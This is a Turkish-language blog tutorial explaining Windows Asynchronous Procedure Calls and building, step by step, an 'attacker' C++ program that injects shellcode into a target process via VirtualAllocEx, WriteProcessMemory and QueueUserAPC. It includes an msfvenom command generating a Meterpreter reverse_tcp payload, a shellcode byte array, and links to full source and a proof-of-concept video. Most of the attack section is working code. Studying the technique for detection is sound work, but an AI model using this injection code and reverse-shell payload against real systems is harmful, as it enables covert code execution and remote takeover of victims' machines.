---
title: APC Queue Code Injection
layout: post
---

# Introduction to APC, Thread and APC Code Injection

Bu yazımda bir **APC (Asynchronous Procedure Call)**'nin ne olduğundan bahsedeceğim. İnternet'te türkçe olarak böyle bir **Code Injection** tekniğinin açıklaması ve örnekleri yapıldımı diye baktığımda hiç bir kaynak bulamadım. Bu yüzdende ben yazmaya karar verdim. 

Yazının ileriki kısımların da **Code Injection** gerçekleştirmek için gerekli olan yazılımı **step-by-step** yani adım adım geliştireceğiz. İlk başlarda sıkıcı-anlaşılmaz gelebilir yalnız tüm anlatım birbiri ile bağlı. Kısaca **giriş-gelişme** sıkabilir bu yüzden **sonuç**'u bekleyelim.

Yazı hakkında kısa bir özet geçmek gerekirse :

* **APC** bir fonksiyondur 
* **Eşzamansız** yani **Asynchronously** çalışan bir fonksiyondur. 
* Bu fonksiyon **Thread**'lerin içeriğinde çalışmaktadır.
* Biz bu tekniği kullanarak **Process**'ler içerisine **Kod** enjekte edebiliyoruz.

Bahsettiğim **Code Injection** tekniğinin daha önce birçok **Zararlı Yazılım** tarafından kullanıldığını gördük. Örneğin :

* **Carberp**
* **DorkBot**
* [APT33](https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html) tarafından geliştirilen **TurnedUp**.

Bu **zararlı yazılım**'lar içerisinde **APC Queue Code Injection** tekniği mevcut.

Yani kısaca anlatmak istediğim popüler bir teknik olduğundan aynı zamanda da bazı **Anti-malware** ve **EDR (Endpoint Detection and Response)** yazılımları tarafından farkedildiğinden, bir **Saldırı** tekniği olarak sıkça kullanılmasını tavsiye etmiyorum.

### APC Nedir ?

Yukarıda basit bir özetini geçtim ama yine de teknik açıdan anlatmakta fayda var.

**Asynchronous Procedure Call (APC)**, **Eşzamansız (Asynchronously)** olarak çalışan, aynı zamanda da **Thread** içeriğinde çalışmakta olan bir fonksiyondur.

Bir **APC**, **Thread** içerisine sunulduğu zaman sistem **Software Interrupt** gerçekleştirir. Dolayısı ile **Thread** tekrar yüklendiğinde ya da çalıştığında o **Thread** bizim **APC** fonksiyonumuzu çalıştırır.

* **System** tarafından oluşturulan bir **APC**'ye **kernel-mode APC** denilir.

* **Application** tarafından oluşturulan bir **APC**'ye ise **user-mode APC** denilmektedir.

Bir **user-mode APC**'nin **Thread** içerisinde çalışması için **Thread**'in bir **Alertable State** içerisinde olması lazımdır çünkü **alertable I/O** dediğimiz olay **asynchronous I/O request**'lerini **process** eder.

Dolayısı ile bir **Thread** eğer **Alertable State** içerisinde olmazsa bir **asynchronous I/O** requesti olan **APC** fonksiyonunu **çalıştıramaz** yani **process** edemez.

**Alertable I/O** ve **APC**'nin gerekli ilişkisini  **Windows** tarafından yazılan bu döküman da daha detaylı öğrenebilirsiniz : [Alertable I/O](https://docs.microsoft.com/en-us/windows/win32/fileio/alertable-i-o)

Aklı biraz açıkgözlülüğe çalışanın aklına hemen şu soru gelecektir :

* **Yani biz eğer process'in içerisinde bulunan thread'e bir APC fonksiyonu gönderirsek ve bu APC fonksiyonu bizim shellcode'umuzu içerirse bu bir APC Queue Code Injection sayılır değil mi ?**

Vereceğim bu cevap ile blog yazısının tüm sihrini kaçıracağım ama yinede okuyanlar için heycanlandırıcı bir yazı olmasını istediğimden bu sorunun cevabı da **Evet**.

### APC Queue Code Injection

Yazdığımız kodu tek tek anlatmaya başlamadan önce **APC**, **Thread**, **Queue** gibi terimleri daha iyi anlaşılması adına tekrar anlatalım.

* **APC (Asynchronous Procedure Call)**  : Asenkron (Eşzamansız) olarak çalışan bir fonksiyondur.
* **Thread** : Bir **Process** yani çalışan bir program içerisinde birden fazla işlemi aynı zamanda gerçekleştirmek istersek oluşturacağımız **Birim** yani **Unit**'tir.
* **APC Queue to Thread** : **Thread** içerisine çalıştırılacak olan fonksiyonu sunmaktır.

Daha da basiti eğer biz bir **Thread** içerisine oluşturduğumuz **APC** fonksiyonunu (bu bir shellcode'da olabilir) eklediğimizde **Thread** hata verip sonraki çalışma esnasın da bizim fonksiyonumuzu çalıştıracağından **process** içerisinde oluşturulan **birim**'leri kontrol edebileceğizdir.

Bu yukarıda anlattığımı kavrayamayan olduysa hiç sorun değil aşağıdaki resim tam olarak **APC Queue Code Injection** tekniğinin nasıl çalıştığını çok basit gözler önüne seriyor.

![](https://i.hizliresim.com/3OgLzp.jpg)

Resimi biraz daha adım adım açmak gerekir ise :

* Bir **Process** oluşturuluyor.
* **Process** içerisinde alan(memory) ayrılıyor.
* Bu alana **Zararlı Kod** enjekte ediliyor.
* Enjekte edilen bu **Zararlı Kod** bir **APC** fonksiyonunun başlangıç adresine veriliyor.
* Ve bu şekilde **APC** fonksiyonu **Zararlı Kod**'u çalıştırıyor.

Şimdi bir **Saldırgan** ve **Kurban** yazılımı oluşturacağız. Ve bu sayede **Kurban**'ın çalıştırdığı **APC** fonksiyonuna bizim **Shellcode**'umuzu enjekte edeceğiz.

Öncelikle **Kurban** kodunu geliştirelim ve içeriğini biraz daha açıklayalım.

### Victim Code

Öncelikle kütüphanelerimizi ekleyelim :

```
#include <iostream>
#include <Windows.h>
```

**Main** fonksiyonunu oluşturalım ve içerisinde bir adet **APC** fonksiyonunu çalıştıralım.

```
int main()
{
    std::cout << "Entering alertable state...\n";
		SleepEx(1000 * 60, true);
}
```

Basit bir şekilde kodumuz bu. Şimdi birazdan **Saldırgan** kodunu geliştirmeye başladığımızda bu kısmı daha iyi anlayacağız.

Buradaki **SleepEx** fonksiyonu bir **APC** fonksiyonudur.

**Windows** tarafından oluşturulan bu **APC** dökümanında hangi fonksiyonlar mevcut bakarsanız **SleepEx**'i görebilirsiniz tabi onun dışında bir çok **APC** fonksiyonu mevcut : 

[Asynchronous Procedure Calls](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)

Birazdan yapacağımız şey basitçe **SleepEx** fonksiyonunun başlangıç adresine bizim oluşturacağımız **Shellcode**'u ekleyeceğiz. Dolayısıyla bu **Kurban** yazılım çalıştığında bizim **Zararlı Kod**'umuzu çalıştıracak.

### Attacker Code

**Saldırgan** kodunu geliştirmeye başlamadan önce alttaki parametreler aracığılıyla **MSFVenom** kullanarak bir **Shellcode** oluşturduğunuzu varsayıyorum.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx EXITFUNC=thread -f c
```

Öncelikle kütüphanelerimizi ekleyelim :

```
#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
```

**Main** fonksiyonunu oluşturalım :

```
int main()
{
}
```

**Saldırgan**'ın kodu biraz uzun olduğundan adım adım ilerleyeceğiz. Kodu tamamen anlattıktan sonra **Pastebin** linkini vereceğim kendiniz derleyip çalıştırmak isterseniz diye.

Şimdi **Shellcode**'umuzu bir değişkene atayalım :

```
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
		"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"
		"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41";
```

**APC** içeren **Zararlı Kod**'u enjekte edeceğimiz **Process**'in **Snapshot**'unu alacağımız değişkeni oluşturalım :

```
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
```

**Kurban** yazılımı içeren **Process**'i tutacak değişkeni oluşturalım :

```
HANDLE victimProcess = NULL;
```

Hekleyeceğimiz **Process**'in kayıtlarını tutacak olan **processEntry**'i ve hekleyeceğimiz **Thread**'in kayıtlarını tutacka olan **threadEntry**'i oluşturalım :

```
PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
```

Hekleyeceğimiz **Process**'in içerdiği **Thread**'ların **ID**'lerini tutacak değişkeni oluşturalım :

```
std::vector<DWORD> threadIds;
```

**Shellcode**'un boyutunu tutacak değişkeni oluşturalım :

```
SIZE_T shellcodeSize = sizeof(shellcode);
```

Sonradan içini açacağımız **Thread**'i bize tutacak olan **threadHandle** değişkenini oluşturalım :

```
HANDLE threadHandle = NULL;
```

Aşşağıdaki **Kod** basit bir şekilde şuanda bilgisayarınzda mevcut çalışan **Process**'lerin dosya ismi ile bizim **Kurban** dosya ismini karşılaştırıp sonrada bulduğunda **processEntry**'ye kaydediyor.

Daha da basit şekilde **Kurban** yazılımı bulup bu yazılımın **Process** kayıtlarını **processEntry**'ye ekliyor. Bu şekilde de **yazılım** üzerinde düzenleme ya da içerik görme gerçekleştirebileceğiz. Örneğin **Kurban** yazılımın **Process ID**'sini görmek gibi vs....

```
if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"testtt1.exe") != 0) {
			Process32Next(snapshot, &processEntry);
		}
	}
```

**Kurban** yazılımı **PROCESS_ALL_ACCESS** değeri ile tüm erişime sahip şekilde **OpenProcess** fonksiyonu aracığılıyla açıyoruz.

```
victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
```

Sonra **Kurban** yazılımın içine **VirtualAllocEx** fonksiyonu aracılığı ile enjekte edeceğimiz **Shellcode**'un boyutu kadar alan ayırıyoruz.

Ayırdığımız alanın **Adresini**'de **shellcodeAddr** değişkenine atıyoruz :

```
LPVOID shellcodeAddr = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

**apcRoutine** değişkeni içerisine **Shellcode** adresimizi atıyoruz.

Bu kısımda kafanız karışmasın bu **değişken**'in ileride ne yaptığını daha iyi anlayacağız :

```
PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeAddr;
```

**VirtualAllocEx** ile **Kurban** yazılımı içerisinde ayırdığımız alana **WriteProcessMemory** fonksiyonu ile bizim **Shellcode** yani **Zararlı Kod**'umuzu yazıyoruz.

```
WriteProcessMemory(victimProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);
```

Aşağıda ki **if** karşılaştırması ile **threadEntry**'nin **Process** içerisinden aldığımız **Snapshot** ile uyumluluğunu sorguluyoruz.

Ve sonraki **do-while** döngüsünde bizim **threadEntry** içerisindeki **Process ID**'si ile **processEntry** içerisindeki **Process ID**'nin aynı olup olmadığını karşılaştırıyoruz.

Eğer aynı ise başta oluşturduğumuz **threadIDs** değişkenine **Process** içerisinde bulunan **Thread** yani çalışan **Birimler** tek tek ekleniyor.

```
if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}
```

Şimdi bu **Saldırgan** kodunun en önemli kısmına geldik.

Aşşağıdaki kod basit bir şekilde şunları yapıyor :

* **for** döngüsü ile yukarıda anlattığımız **do-while** döngüsünden çıkan **Thread ID**'leri alınıyor.
* **printf** ile bu **Thread ID**'ler ekrana yazılıyor.
* Her döngü çalıştığında mevcut olan **Thread** tüm yetkilerle yani **THREAD_ALL_ACCESS** ile **OpenThread** fonksiyonu kullanılarak **threadHandle** değişkenin içerisine aktarılıyor.

En önemli bölüme geldik **QueueUserAPC**. Bu fonksiyon basit bir şekilde bizim başta içerisine **Shellcode** adresimizi aktardığımız **apcRoutine** değişkenini alıyor ilk parametre olarak.

İkinci paramterle olarakta bir üstünde belirttiğimiz **threadHandle** değişkenini alıyor yani her döngüde yenilenen **Kurban** yazılım içerisinde bulunan **Thread**'leri.

```
for (DWORD threadId : threadIds) {
		printf("Thread : 0x%08x\n", threadId);
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		getchar();
	}
	
return 0;
```

Bu fonksiyonun basitçe yaptığı şu **Shellcode** adresimizi bir **APC** fonksiyonu olarak görüyor ve bunu **Kurban** yazılım içerisinde çalışan **Thread**'lerden birine atıyor.

Dolayısı ile **Thread** bizim **Shellcode**'umuzu çalıştırıyor.

Tabi diyebilirsiniz ki **Hangi thread'ı kullanması gerektiğini nereden biliyor ?** diye. Çok güzel bir soru.

Seçtiği **Thread**'ın içeriği bir **Alertable State** içeren **APC** fonksiyonu olmak zorunda.

Daha da basiti : **SleepEx**'i içeren bir **Thread** ise **Shellcode** çalışıyor.

**Döngü**'nün son kodu olarak eklediğim **getchar** bunu sağlıyor aslında.

Yani eğer **Shellcode**'u ekleyeceği doğru **Thread** değilse **ENTER** tuşuna basıp program içerisindeki başka bir **Thread**'ı deneyebiliyoruz.

Ama **Kurban** yazılım içerisinde sadece bir **APC** fonksiyonu kullandığımızdan oda **SleepEx** fonksiyonu olduğundan ilk **Thread**'da direk **Meterpreter**'den **reverse_tcp** yani erişimi alacağızdır.

**Saldırgan**'ın tüm kaynak kodu : [Saldırgan](https://github.com/blacknbunny/blacknbunny.github.io/blob/master/files/attacker.c)

### Proof Of Concept ( PoC )

**Saldırgan** ve **Kurban** yazılımlarının **APC Queue Code Injection** etkileşiminin gerçekleştiği bir video hazırladım bakmak isterseniz.

Video : [APC Queue Code Injection PoC](https://www.youtube.com/watch?v=KmrTowxl6Ho)

# THE END
Bu yazının sonuna da geldik.

**Process Shellcode Injection** tekniklerinden sadece bir tanesidir bu.

Daha önce **Process Shellcode Injection** nedir hakkında bir yazı yayınladım eğer anlayamayan olduysa bu yazıyı. 

Bakmanızı öneririm : [Process Shellcode Injection](https://blacknbunny.github.io/2019/04/28/Process-Shellcode-Injection.html)
